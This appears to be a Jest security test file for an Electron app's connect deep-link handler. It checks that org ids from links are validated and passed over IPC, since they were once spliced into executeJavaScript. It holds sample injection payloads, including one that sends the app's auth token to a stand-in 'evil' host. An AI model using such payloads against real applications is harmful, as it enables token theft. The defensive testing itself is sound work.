'use strict';

/**
 * lana-ai://connect/<org-id> (electron-main.js handleConnectLink). The org id came
 * from any website that opens the link; it used to be spliced into
 * executeJavaScript inside '...', so a quote ran script in the app window with
 * the full preload (token, saveSettings). Now the id must match the org id
 * pattern and reaches the sign-in page as data over IPC.
 */

const fs = require('fs');
const path = require('path');
const { connectLinkOrgId, createConnectOrgQueue } = require('../../electron-app-links');

const ROOT = path.join(__dirname, '..', '..');
const read = (file) => fs.readFileSync(path.join(ROOT, file), 'utf8');

const EXPLOIT = "lana-ai://connect/x';location='https://evil/?'+lanaAuthToken.get();'";

describe('connectLinkOrgId', () => {
  test('a real org id is accepted (trimmed, lowercased)', () => {
    expect(connectLinkOrgId(new URL('lana-ai://connect/smithlaw'))).toBe('smithlaw');
    expect(connectLinkOrgId(new URL('lana-ai://connect/Smith-Law-2'))).toBe('smith-law-2');
    expect(connectLinkOrgId(new URL('lana-ai://connect/smithlaw/'))).toBe('smithlaw');
  });

  test('the exploit link and anything with quotes or script is refused', () => {
    expect(connectLinkOrgId(new URL(EXPLOIT))).toBe(null);
    expect(connectLinkOrgId(new URL('lana-ai://connect/x"onload="alert(1)'))).toBe(null);
    expect(connectLinkOrgId(new URL('lana-ai://connect/x%27;alert(1)//'))).toBe(null);
    expect(connectLinkOrgId(new URL('lana-ai://connect/a/b'))).toBe(null);
    expect(connectLinkOrgId(new URL('lana-ai://connect/'))).toBe(null);
    expect(connectLinkOrgId(new URL('lana-ai://connect/' + 'a'.repeat(101)))).toBe(null);
    expect(connectLinkOrgId(new URL('lana-ai://connect/%E0%A4%A'))).toBe(null);
  });
});

describe('createConnectOrgQueue (a connect link that opened the sign-in window)', () => {
  test('the org id goes only to the sign-in window opened for it, once', () => {
    const queue = createConnectOrgQueue({ now: () => 0 });
    expect(queue.take(7)).toBe(null);
    queue.offer('smithlaw', 7);
    queue.offer('jonesfirm', 7);
    expect(queue.take(8)).toBe(null);
    // A take from any other window drops it: that was not the link's sign-in page.
    expect(queue.take(7)).toBe(null);
    queue.offer('jonesfirm', 7);
    expect(queue.take(7)).toEqual({ orgId: 'jonesfirm', error: null });
    expect(queue.take(7)).toBe(null);
  });

  test('an invalid link waits the same way, as an error the sign-in page shows', () => {
    const queue = createConnectOrgQueue({ now: () => 0 });
    queue.offerError(3);
    expect(queue.take(4)).toBe(null);
    queue.offerError(3);
    expect(queue.take(3)).toEqual({ orgId: null, error: 'invalid_link' });
  });

  test('an old link, an invalid id, or a sign-out drops it', () => {
    let now = 0;
    const queue = createConnectOrgQueue({ now: () => now, ttlMs: 1000 });
    queue.offer('smithlaw', 1);
    now = 1001;
    expect(queue.take(1)).toBe(null);
    queue.offer("x';alert(1)'", 1);
    expect(queue.take(1)).toBe(null);
    queue.offer('smithlaw', 1);
    queue.clear();
    expect(queue.take(1)).toBe(null);
  });

  test('electron-main.js queues the link only for the sign-in window it opens, takes it there, and clears it on sign-out', () => {
    const main = read('electron-main.js');
    const handler = main.slice(main.indexOf('const handleConnectLink'), main.indexOf('\n};', main.indexOf('const handleConnectLink')));
    expect(handler).toMatch(/connectOrgQueue\.offer\(orgId, contentsId\)/);
    expect(handler).toMatch(/connectOrgQueue\.offerError\(contentsId\)/);
    expect(main).toMatch(/ipc\.handle\('connect-link:take', \(event\) => connectOrgQueue\.take\(event\.sender\.id\) \|\| \{ orgId: null, error: null \}\)/);
    const tokenChange = main.slice(main.indexOf('registerTokenIpc(ipc, authTokenStore'), main.indexOf('\n});', main.indexOf('registerTokenIpc(ipc, authTokenStore')));
    expect(tokenChange).toMatch(/if \(!authTokenStore\.get\(\)\) connectOrgQueue\.clear\(\);/);
    const { IPC_POLICY } = require('../../electron-ipc-policy');
    expect(IPC_POLICY['connect-link:take']).toMatchObject({ kind: 'invoke', pages: ['login.html'] });
    expect(read('src/login.html')).toMatch(/electronAPI\.takeConnectLink\(\)/);
  });
});

describe('deep links never open a modal (a sync dialog in these handlers hung the app until SIGKILL)', () => {
  const main = read('electron-main.js');
  const section = (start, end) => {
    const from = main.indexOf(start);
    expect(from).toBeGreaterThan(-1);
    return main.slice(from, main.indexOf(end, from));
  };
  const SYNC_DIALOG = /showErrorBox|showMessageBoxSync|showOpenDialogSync|showSaveDialogSync|showCertificateTrustDialog/;

  test.each([
    ['handleDeepLink', () => section('const handleDeepLink', '\n};')],
    ['handleOAuthCallback', () => section('const handleOAuthCallback', '\n};')],
    ['handleConnectLink', () => section('const handleConnectLink', '\n};')],
    ['open-url', () => section("app.on('open-url'", '\n});')],
    ['second-instance', () => section("app.on('second-instance'", '\n  });')],
    ['the app-link router\'s window pieces', () => section('function showMainWindow()', 'const appLinkRouter')],
    ['navigateClientDeepLink', () => section('async function navigateClientDeepLink', '\n}')]
  ])('%s', (_name, text) => {
    expect(text()).not.toMatch(SYNC_DIALOG);
  });

  test('electron-app-links.js has no sync dialog', () => {
    expect(read('electron-app-links.js')).not.toMatch(SYNC_DIALOG);
  });
});

describe('the script sink scanner', () => {
  const { scriptSinkProblems } = require('./helpers/script-sink-scan');

  test('fixed text passes', () => {
    expect(scriptSinkProblems("w.executeJavaScript('1 + 1', true)")).toEqual([]);
    expect(scriptSinkProblems('w.insertCSS("body { color: red }")')).toEqual([]);
    expect(scriptSinkProblems('w.executeJavaScript(`(() => 1)()`)')).toEqual([]);
  });

  test('anything built from a value is caught, however the call is written', () => {
    const bad = [
      "w.executeJavaScript('a' + x)",
      'w.executeJavaScript(`a ${x}`)',
      'w.executeJavaScript (script)',
      "w['executeJavaScript'](code)",
      'w["insertCSS"]("a" + css)',
      'w.executeJavaScript(\n  "a" +\n  b)',
      'w.insertCSS(css, { cssOrigin: "user" })',
      "w.executeJavaScript('a', true) + w.executeJavaScript(x)"
    ];
    for (const source of bad) expect({ source, problems: scriptSinkProblems(source).length > 0 }).toEqual({ source, problems: true });
  });
});

describe('no page script is built from outside input', () => {
  const { scriptSinkProblems, mainProcessFiles } = require('./helpers/script-sink-scan');
  const files = mainProcessFiles(ROOT);

  // electron-origin-migration.js builds its write script from fixed text and base64 data only
  // (its own tests feed it quotes and script).
  const BASE64_ONLY = ['electron-origin-migration.js'];

  test('the scan covers the root modules, src main-process modules, screen voice, session tracking and the Briefs host', () => {
    for (const expected of ['electron-main.js', 'electron-updater-custom.js', 'src/electron-brainchild-manager.js', 'src/screen-voice/electron-screen-voice.js', 'js/session/session-tracker.js', 'briefs/packages/host/src/main/host.ts']) {
      expect(files).toContain(expected);
    }
  });

  test('executeJavaScript and insertCSS take only fixed text everywhere in the main process', () => {
    const problems = files
      .filter((file) => !BASE64_ONLY.includes(file))
      .flatMap((file) => scriptSinkProblems(read(file)).map((problem) => `${file}: ${problem}`));
    expect(problems).toEqual([]);
  });

  test('the storage migration script carries old values as base64 only', () => {
    const { writeScript } = require('../../electron-origin-migration');
    const script = writeScript([["k'", "x';location='https://evil/?'+1;'"], ['b', '"`${x}`</script>']]);
    const data = script.slice(script.indexOf('atob("') + 6, script.indexOf('")'));
    expect(data).toMatch(/^[A-Za-z0-9+/=]+$/);
    expect(script.replace(data, '')).not.toMatch(/evil|<\/script>|\$\{x\}/);
  });

  test('the connect link fills the sign-in page through IPC', () => {
    const main = read('electron-main.js');
    const handler = main.slice(main.indexOf('const handleConnectLink'), main.indexOf('};', main.indexOf('const handleConnectLink')));
    expect(handler).not.toMatch(/executeJavaScript/);
    expect(handler).toMatch(/connectLinkOrgId\(urlObj\)/);
    expect(handler).toMatch(/webContents\.send\('connect-link:org', \{ orgId \}\)/);
    expect(handler).toMatch(/webContents\.send\('connect-link:org', \{ error: 'invalid_link' \}\)/);
    expect(read('electron-preload.js')).toMatch(/onConnectLink: \(callback\) =>/);
    const login = read('src/login.html');
    expect(login).toMatch(/electronAPI\.onConnectLink\(/);
    expect(login).toMatch(/Invalid connection link\./);
  });
});

test('nothing still names the old connect-link API (onConnectOrg, takeConnectOrg)', () => {
  for (const file of ['electron-main.js', 'electron-preload.js', 'electron-app-links.js', 'electron-ipc-policy.js', 'src/login.html']) {
    expect({ file, stale: /onConnectOrg|takeConnectOrg/.test(read(file)) }).toEqual({ file, stale: false });
  }
});
